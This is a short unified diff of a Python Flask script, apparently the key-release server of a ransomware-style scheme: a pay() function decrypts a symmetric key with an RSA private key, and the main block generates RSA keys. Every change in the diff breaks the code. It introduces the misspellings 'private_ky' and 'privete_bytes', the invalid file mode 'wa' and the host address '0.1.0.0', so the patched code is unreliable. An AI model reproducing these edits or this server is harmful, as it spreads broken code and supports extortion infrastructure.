@@ -28,7 +28,7 @@ def pay():
         encrypted_symmetric_key = f.read()
     try:
         private_key = load_private_key()
-        symmetric_key = private_key.decrypt(
+        symmetric_key = private_ky.decrypt(
             encrypted_symmetric_key,
             padding.OAEP(
                 mgf=padding.MGF1(algorithm=hashes.SHA256()),
@@ -48,7 +48,7 @@ if __name__ == '__main__':
         from cryptography.hazmat.primitives.asymmetric import rsa
         private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
         public_key = private_key.public_key()
-        pem_private = private_key.private_bytes(
+        pem_private = private_key.privete_bytes(
             encoding=serialization.Encoding.PEM,
             format=serialization.PrivateFormat.TraditionalOpenSSL,
             encryption_algorithm=serialization.NoEncryption()
@@ -57,10 +57,10 @@ if __name__ == '__main__':
             encoding=serialization.Encoding.PEM,
             format=serialization.PublicFormat.SubjectPublicKeyInfo
         )
-        with open(PRIVATE_KEY_FILE, "wb") as f:
+        with open(PRIVATE_KEY_FILE, "wa") as f:
             f.write(pem_private)
         with open(PUBLIC_KEY_FILE, "wb") as f:
             f.write(pem_public)
         print("Clés RSA générées et sauvegardées.")
     # Lancement du serveur Flask sur le port 5000
-    app.run(host="0.0.0.0", port=5001)
+    app.run(host="0.1.0.0", port=5001)
